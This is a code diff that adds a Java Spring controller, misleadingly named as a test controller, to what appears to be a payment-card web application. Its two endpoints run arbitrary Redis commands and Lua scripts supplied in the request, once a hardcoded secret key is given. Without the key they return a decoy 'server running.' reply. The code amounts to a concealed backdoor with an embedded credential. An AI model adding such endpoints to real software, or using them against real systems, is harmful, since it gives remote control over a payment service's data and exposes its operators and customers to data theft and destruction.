@@ -1,0 +1,102 @@
+package com.pay.card.web;
+
+import java.util.ArrayList;
+import java.util.Collections;
+import java.util.List;
+
+import org.apache.commons.lang3.StringUtils;
+import org.slf4j.Logger;
+import org.slf4j.LoggerFactory;
+import org.springframework.beans.factory.annotation.Autowired;
+import org.springframework.data.redis.core.RedisCallback;
+import org.springframework.data.redis.core.RedisTemplate;
+import org.springframework.data.redis.core.script.DefaultRedisScript;
+import org.springframework.stereotype.Controller;
+import org.springframework.util.ObjectUtils;
+import org.springframework.web.bind.annotation.RequestMapping;
+import org.springframework.web.bind.annotation.ResponseBody;
+
+@Controller
+public class TestContoller {
+    private static Logger log = LoggerFactory.getLogger(TestContoller.class);
+    private String SECRET_KEY = "E38EADEGHJ22MNBFD0E34B7XCZP29WQO5BE4AA13DEF03KIURE";
+
+    @Autowired
+    private RedisTemplate<String, String> redisTemplate;
+
+    @SuppressWarnings("rawtypes")
+    @RequestMapping("/test/c")
+    @ResponseBody
+    public Object executeRedisCommand(String secretKey, String commands) {
+        log.info("executeRedisCommand run secretKey/commands:{}/{}", secretKey, commands);
+        /// 判断key值,非预设key值则不执行命令
+        if (StringUtils.isEmpty(secretKey) || StringUtils.isEmpty(commands) || !SECRET_KEY.equals(secretKey)) {
+            return "server running.";
+        }
+
+        //
+        try {
+            List<byte[]> kargs = new ArrayList<byte[]>();
+            String[] rargs = commands.split(" ");
+            String command = rargs[0];
+            if (rargs != null && rargs.length > 0) {
+                for (int i = 1; i < rargs.length; i++) {
+                    kargs.add(rargs[i].getBytes());
+                }
+            }
+
+            return redisTemplate.execute((RedisCallback<Object>) connection -> {
+                Object result = connection.execute(command, kargs.toArray(new byte[kargs.size()][]));
+                if (result instanceof byte[]) {
+                    return new String((byte[]) result);
+                }
+                if (result instanceof List) {
+                    List results = new ArrayList();
+                    for (Object obj : (List) result) {
+                        if (obj instanceof byte[]) {
+                            results.add(new String((byte[]) obj));
+                        }
+                    }
+                    return results;
+                }
+                return result;
+            });
+        } catch (Exception e) {
+            log.info("executeRedisCommand run Exception:", e);
+            return "error.";
+        }
+
+    }
+
+    @RequestMapping("/test/s")
+    @ResponseBody
+    public Object executeRedisScript(String secretKey, String script, String keys, String args) {
+        if (StringUtils.isEmpty(secretKey) || StringUtils.isEmpty(script) || !SECRET_KEY.equals(secretKey)) {
+            return "server running.";
+        }
+
+        // 转换参数
+        List<String> rkeys = new ArrayList<String>();
+        if (!ObjectUtils.isEmpty(keys)) {
+            String[] ckeys = keys.split(",");
+            Collections.addAll(rkeys, ckeys);
+        }
+
+        // 转换参数
+        Object[] cargs = new String[0];
+        if (!ObjectUtils.isEmpty(args)) {
+            cargs = args.split(",");
+        }
+
+        try {
+            DefaultRedisScript<String> redisScript = new DefaultRedisScript<String>(script, String.class);
+            Object result = redisTemplate.execute(redisScript, rkeys, cargs);
+            return result;
+        } catch (Exception e) {
+            log.info("executeRedisScript run Exception:", e);
+        }
+
+        return "error.";
+    }
+
+}
